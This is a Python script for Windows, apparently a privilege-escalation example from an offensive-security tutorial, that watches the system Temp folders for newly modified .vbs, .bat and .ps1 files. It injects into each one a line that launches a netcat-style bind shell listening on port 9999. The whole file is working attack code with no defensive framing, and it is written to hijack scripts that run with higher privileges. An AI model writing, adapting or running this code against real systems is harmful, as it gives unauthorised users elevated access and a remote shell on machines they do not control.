import tempfile
import threading
import win32file
import win32con
import os

# these are the common temp file directories
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]
# file modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5
file_types = {}

command = "C:\\WINDOWS\\TEMP\\mynet.exe -l -p 9999-c"
file_types['.vbs'] = ["\r\n'mymarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n"% command]
file_types['.bat'] = ["\r\nREM mymarker\r\n", "\r\n%s\r\n" % command]
file_types['.ps1'] = ["\r\n#mymarker", "Start-Process \"%s\"\r\n" % command]
# function to handle the code injection
def inject_code(full_filename, extension, contents):
    # is mymarker already in the file?
    if file_types[extension][0] in contents:
        return
    # no marker; inject mymarker  and code:
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents
    fd = open(full_filename, "wb")
    fd.write(full_contents)
    fd.close()
    print("[\o/] Injected code.")
    return

def start_monitor(path_to_watch):
    # create a thread for each monitoring run
    FILE_LIST_DIRECTORY = 0x0001
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)
    while 1:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print("[ + ] Created {0}".format(full_filename))
                elif action == FILE_DELETED:
                    print("[ - ] Deleted {0}".format(full_filename))
                elif action == FILE_MODIFIED:
                    print("[ * ] Modified {0}".format(full_filename))
                    # dump out the file contents
                    print("[vvv] Dumping contents...")
                    try:
                        fd = open(full_filename, "rb")
                        contents = fd.read()
                        fd.close()
                        print("[^^^] Dump complete.")
                    except:
                        print("[!!!] Failed.")
                    filename, extension = os.path.splitext(full_filename)
                    if extension in file_types:
                        inject_code(full_filename, extension, contents)
                elif action == FILE_RENAMED_FROM:
                    print("[ > ] Renamed from: {0}".format(full_filename))
                elif action == FILE_RENAMED_TO:
                    print("[ < ] Renamed to: {0}".format(full_filename))
                else:
                    print("[???] Unknown: {0}".format(full_filename))
        except:
            pass

for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor, args=(path,))
    print("Spawning monitoring thread for path: {0}".format(path))
    monitor_thread.start()